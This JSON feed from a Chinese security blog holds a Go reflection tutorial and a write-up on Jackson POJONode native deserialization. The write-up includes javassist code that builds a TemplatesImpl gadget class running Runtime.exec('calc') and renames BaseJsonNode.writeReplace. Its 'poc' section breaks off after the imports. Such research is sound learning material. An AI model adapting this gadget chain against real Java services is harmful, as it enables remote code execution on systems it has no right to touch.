{
    "version": "https://jsonfeed.org/version/1",
    "title": "love hack • All posts by \"web\" tag",
    "description": "",
    "home_page_url": "https://pr0phet1.github.io",
    "items": [
        {
            "id": "https://pr0phet1.github.io/2025/07/30/go-reflect/",
            "url": "https://pr0phet1.github.io/2025/07/30/go-reflect/",
            "title": "go-reflect",
            "date_published": "2025-07-30T11:17:09.000Z",
            "content_html": "<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>go语音作为一门编译型语言，无需任何依赖环境，并由于其优良的并发性和强大的原生包，我们安全开发选择go语言作为主语言，是一个不错的选择</p>\n<h1 id=\"reflect\"><a href=\"#reflect\" class=\"headerlink\" title=\"reflect\"></a>reflect</h1><h2 id=\"基础理解\"><a href=\"#基础理解\" class=\"headerlink\" title=\"基础理解\"></a>基础理解</h2><p>在reflect中有两个重要函数和相应的类型</p>\n<ul>\n<li>ValueOf  —-  value</li>\n<li>TypeOf   —-  type</li>\n</ul>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;reflect&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a <span class=\"type\">int</span> = <span class=\"number\">100</span></span><br><span class=\"line\">\tof := reflect.ValueOf(a)</span><br><span class=\"line\">\ttypeOf := reflect.TypeOf(a)</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(of, typeOf)</span><br><span class=\"line\">\tfmt.Printf(<span class=\"string\">&quot;%T\\n%T&quot;</span>, of, typeOf)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img data-src=\"/2025/07/30/go-reflect/image-20250731085325108.png\" alt=\"image-20250731085325108\"></p>\n<p>可以看到输出结果，输出结果和类型</p>\n<p>他们本身也有各自的调用方法，我这里只举例一些常用的</p>\n<p>reflect.Value.Type()</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a <span class=\"type\">int</span> = <span class=\"number\">100</span></span><br><span class=\"line\">\tof := reflect.ValueOf(a)</span><br><span class=\"line\">\tfmt.Println(of.Type())</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出：main.yuanshen</span></span><br></pre></td></tr></table></figure>\n\n<p>获取数据定义类型名</p>\n<p>reflect.Value.Kind()</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a yuanshen = <span class=\"number\">100</span></span><br><span class=\"line\">\tof := reflect.ValueOf(a)</span><br><span class=\"line\">\tfmt.Println(of.Kind())</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出：int</span></span><br></pre></td></tr></table></figure>\n\n<p>获取数据底层类型名称</p>\n<p>reflect.Value.Elem()</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a yuanshen = <span class=\"number\">100</span></span><br><span class=\"line\">\tof := reflect.ValueOf(&amp;a)</span><br><span class=\"line\">    fmt.Println(of)</span><br><span class=\"line\">\tfmt.Println(of.Elem())</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出：0xc00010c0a8</span></span><br><span class=\"line\"><span class=\"comment\">//\t   100</span></span><br></pre></td></tr></table></figure>\n\n<p>这里我们ValueOf获取的是a的地址值，因此输出的是a指针的反射值，这里我们调用Elem获取的才是a指针指向的值的反射值</p>\n<p>reflect.Value.Canset()</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a yuanshen = <span class=\"number\">100</span></span><br><span class=\"line\">\tvalueOf := reflect.ValueOf(a)</span><br><span class=\"line\">\tof := reflect.ValueOf(&amp;a)</span><br><span class=\"line\">\tfmt.Println(valueOf.CanSet())</span><br><span class=\"line\">\tfmt.Println(of.CanSet())</span><br><span class=\"line\">\tfmt.Println(of.Elem().CanSet())</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出： false</span></span><br><span class=\"line\"><span class=\"comment\">//\t\tfalse</span></span><br><span class=\"line\"><span class=\"comment\">//\t\ttrue</span></span><br></pre></td></tr></table></figure>\n\n<p>函数作用就是检验这个反射值是否我们可以修改</p>\n<p>第一个false是因为我们获得是a的拷贝值，进行修改也无法修改a本身的值</p>\n<p>第二个false是因为我们取得是a的指针的反设值，进行修改相当于改地址，而不是改值</p>\n<p>第三个true是因为我们获取的是a的指针指向的值得反射值</p>\n<p>reflect.Indirect()</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"number\">1</span></span><br><span class=\"line\">    of := reflect.ValueOf(&amp;a)</span><br><span class=\"line\">    indirect := reflect.Indirect(of)</span><br><span class=\"line\">    fmt.Println(of.CanSet())</span><br><span class=\"line\">    fmt.Println(indirect.CanSet())</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出： false</span></span><br><span class=\"line\"><span class=\"comment\">//\t\ttrue</span></span><br></pre></td></tr></table></figure>\n\n<p>无需Elem，直接根据指针反射值找寻到指针指向的值，可用于多级指针使用</p>\n<p>reflect.Value.Set()</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a yuanshen = <span class=\"number\">100</span></span><br><span class=\"line\">\tof := reflect.ValueOf(&amp;a)</span><br><span class=\"line\">\tof.Elem().SetInt(<span class=\"number\">200</span>)</span><br><span class=\"line\">\tfmt.Println(a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出：200</span></span><br></pre></td></tr></table></figure>\n\n<p>设置新值</p>\n<p>reflect.Type.Elem()</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\ta := []<span class=\"type\">int</span>&#123;<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>&#125;</span><br><span class=\"line\">\tof := reflect.TypeOf(a)</span><br><span class=\"line\">\tfmt.Println(of.Elem())</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出：int</span></span><br></pre></td></tr></table></figure>\n\n<p>获取切片元素类型，接口，结构体同样使用</p>\n<h2 id=\"高级用法\"><a href=\"#高级用法\" class=\"headerlink\" title=\"高级用法\"></a>高级用法</h2><p>获取 struct 信息的一些方法：</p>\n<ul>\n<li>NumField() 获取结构体字段数量</li>\n<li>Field(i) 可以通过 i 字段索引来获取结构体字段信息，比如 Field(i).Name 获取字段名</li>\n<li>FieldByName(name) 通过 name 获取字段信息</li>\n<li>MethodByName()获取的是与指定方法名相关联的反射方法</li>\n<li>Call()实例化反射方法</li>\n</ul>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tp := yuanshen&#123;<span class=\"string\">&quot;paimeng&quot;</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>&#125;</span><br><span class=\"line\">\tof := reflect.ValueOf(&amp;p)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i := <span class=\"keyword\">range</span> of.Elem().NumField() &#123;</span><br><span class=\"line\">\t\tfmt.Println(of.Elem().Field(i))</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tof.MethodByName(<span class=\"string\">&quot;Sing&quot;</span>).Call([]reflect.Value&#123;reflect.ValueOf(<span class=\"string\">&quot;oh,baby&quot;</span>)&#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出结果：paimeng</span></span><br><span class=\"line\"><span class=\"comment\">//\t\t  3</span></span><br><span class=\"line\"><span class=\"comment\">//\t\t  10</span></span><br><span class=\"line\"><span class=\"comment\">//\t\t  及你太美oh,baby</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>reflect.SliceOf(t)创建一个切片类型，其元素类型为t</li>\n<li>reflect.MakeSlice()创建一个指定类型的空切片</li>\n<li>reflect.New(t)创建一个t类型实例，并返回指针</li>\n<li>reflect.Append(slice, newP2)将新元素追加到切片</li>\n</ul>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tp := yuanshen&#123;<span class=\"string\">&quot;paimeng&quot;</span>, <span class=\"number\">3</span>&#125;</span><br><span class=\"line\">\tt := reflect.TypeOf(p)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 创建新切片</span></span><br><span class=\"line\">\tslice := reflect.MakeSlice(reflect.SliceOf(t), <span class=\"number\">0</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 添加元素到切片</span></span><br><span class=\"line\">\tnewP1 := reflect.New(t).Elem()</span><br><span class=\"line\">\tnewP1.FieldByName(<span class=\"string\">&quot;name&quot;</span>).SetString(<span class=\"string\">&quot;xinxin&quot;</span>)</span><br><span class=\"line\">\tnewP1.FieldByName(<span class=\"string\">&quot;age&quot;</span>).SetInt(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tnewP2 := reflect.New(t).Elem()</span><br><span class=\"line\">\tnewP2.FieldByName(<span class=\"string\">&quot;name&quot;</span>).SetString(<span class=\"string\">&quot;dalaoyang&quot;</span>)</span><br><span class=\"line\">\tnewP2.FieldByName(<span class=\"string\">&quot;age&quot;</span>).SetInt(<span class=\"number\">100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tslice = reflect.Append(slice, newP1)</span><br><span class=\"line\">\tslice = reflect.Append(slice, newP2)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 遍历切片</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i := <span class=\"number\">0</span>; i &lt; slice.Len(); i++ &#123;</span><br><span class=\"line\">\t\tfmt.Printf(<span class=\"string\">&quot;切片元素 %d: %+v\\n&quot;</span>, i, slice.Index(i).Interface())</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//输出结果：\t切片元素 0: &#123;Name:xinxin Age:5&#125;</span></span><br><span class=\"line\"><span class=\"comment\">//\t\t   切片元素 1: &#123;Name:dalaoyang Age:100&#125;</span></span><br></pre></td></tr></table></figure>\n\n\n\n",
            "tags": [
                "web",
                "go"
            ]
        },
        {
            "id": "https://pr0phet1.github.io/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://pr0phet1.github.io/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "jackson原生反序列化",
            "date_published": "2025-07-26T04:58:08.000Z",
            "content_html": "<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>jackson在序列化时会调用get方法，反序列化时会调用set方法<br>spring框架中内置的有jackson包，因此我们也需要学习jackson的相关序列化调用<br>在POJONode这一个类中，恰恰可以满足我们的触发条件，去触发get方法，具体看下文分析</p>\n<p>管理依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jackson-core<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.13.3<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jackson-annotations<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.13.3<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jackson-databind<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.13.3<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"POJONode\"><a href=\"#POJONode\" class=\"headerlink\" title=\"POJONode\"></a>POJONode</h1><p><img data-src=\"/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726102745276.png\" alt=\"image-20250726102745276\"></p>\n<p><img data-src=\"/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726103655567.png\" alt=\"image-20250726103655567\"></p>\n<p>可以看到在其父类BaseJsonNode类中，书写了toString方法</p>\n<p><img data-src=\"/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726104101037.png\" alt=\"image-20250726104101037\"></p>\n<p>调用了InternalNodeMapper.nodeToString，执行了writeValueAsString，执行序列化对本身，这里的STD_WRITER这一常量，我们在追踪看下</p>\n<p><img data-src=\"/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726104646009.png\" alt=\"image-20250726104646009\"></p>\n<p>可以看到这一常量就是JsonMapper.writer()的返回结果</p>\n<p><img data-src=\"/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726105126127.png\" alt=\"image-20250726105126127\"></p>\n<p>JsonMapper.writer()返回ObjectWriter对象</p>\n<p><code>ObjectWriter</code> 是 Jackson 中专门用于序列化对象的组件，它是从 <code>ObjectMapper</code> 衍生出来的，可以提供更灵活的序列化配置</p>\n<p>说白了就是ObjectWriter可以简单理解为高配版的ObjectMapper序列化，作用不变</p>\n<p>那总结一下调用BaseJsonNode的toString方法相当于ObjectWriter,writeValueAsString(BaseJsonNode)</p>\n<h1 id=\"报错原因\"><a href=\"#报错原因\" class=\"headerlink\" title=\"报错原因\"></a>报错原因</h1><p>可以看到停在了序列化writeObject</p>\n<p><img data-src=\"/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726114504968.png\" alt=\"image-20250726114504968\"></p>\n<p><img data-src=\"/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726120222881.png\" alt=\"image-20250726120222881\"></p>\n<p>然后就抛出错误停止执行了，究其原因就是可以看到在POJONode的父类BaseJsonNode中具有writeReplace方法</p>\n<h2 id=\"writeReplace\"><a href=\"#writeReplace\" class=\"headerlink\" title=\"writeReplace\"></a>writeReplace</h2><ol>\n<li><strong>基本概念</strong><ul>\n<li>在 Java 反序列化过程中，<code>writeReplace</code> 方法是一个特殊的钩子方法，用于在对象被序列化时，替换当前对象。它定义在 <code>ObjectOutputStream</code> 类中，方法签名是 <code>protected Object writeReplace()</code>。</li>\n<li>当对象被序列化时，如果该对象的类定义了 <code>writeReplace</code> 方法，<code>ObjectOutputStream</code> 会优先调用这个方法来获取一个替代对象，然后对这个替代对象进行序列化操作，而不是直接序列化原始对象。</li>\n</ul>\n</li>\n<li><strong>作用场景</strong><ul>\n<li><strong>对象的安全性增强</strong><ul>\n<li>例如，假设有一个包含敏感信息（如密码等）的对象。在序列化这个对象时，我们不希望敏感信息被暴露。可以利用 <code>writeReplace</code> 方法返回一个新的对象，这个新对象将敏感信息移除或者替换为安全的占位符。</li>\n</ul>\n</li>\n<li><strong>优化序列化数据</strong><ul>\n<li>有时候对象本身可能包含一些在序列化过程中不需要或者不适合存储的数据。通过 <code>writeReplace</code> 方法可以返回一个简化后的对象用于序列化。</li>\n<li>例如，一个对象有一个很大的临时缓存数组，在序列化时可以不需要保存这个数组。就可以在 <code>writeReplace</code> 方法中返回一个去掉了缓存数组的新对象。</li>\n</ul>\n</li>\n<li><strong>处理对象的引用问题</strong><ul>\n<li>在某些情况下，同一个对象可能在多个地方被引用。为了优化序列化后的数据结构或者满足某些特殊的序列化需求，可以使用 <code>writeReplace</code> 来替换对象，使得引用关系在序列化后得到重新组织。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"解决方式\"><a href=\"#解决方式\" class=\"headerlink\" title=\"解决方式\"></a>解决方式</h2><p>因为无法通过源码进行修改，我们可以通过反射直接将这个方法换成别的名字，简单粗暴，</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">classPool.insertClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">cc</span> <span class=\"operator\">=</span> classPool.makeClass(<span class=\"string\">&quot;Evil&quot;</span>);</span><br><span class=\"line\">String cmd= <span class=\"string\">&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;</span>;</span><br><span class=\"line\">cc.makeClassInitializer().insertBefore(cmd);</span><br><span class=\"line\">cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class=\"line\"><span class=\"comment\">//新增修改writeReplace方法名</span></span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.getCtClass(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">writeReplace</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">writeReplace.setName(<span class=\"string\">&quot;propeht&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//JVM加载修改后的类</span></span><br><span class=\"line\">ctClass.toClass();</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h1><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class=\"line\"><span class=\"keyword\">import</span> groovy.transform.Undefined;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassClassPath;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtMethod;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">poc</span> 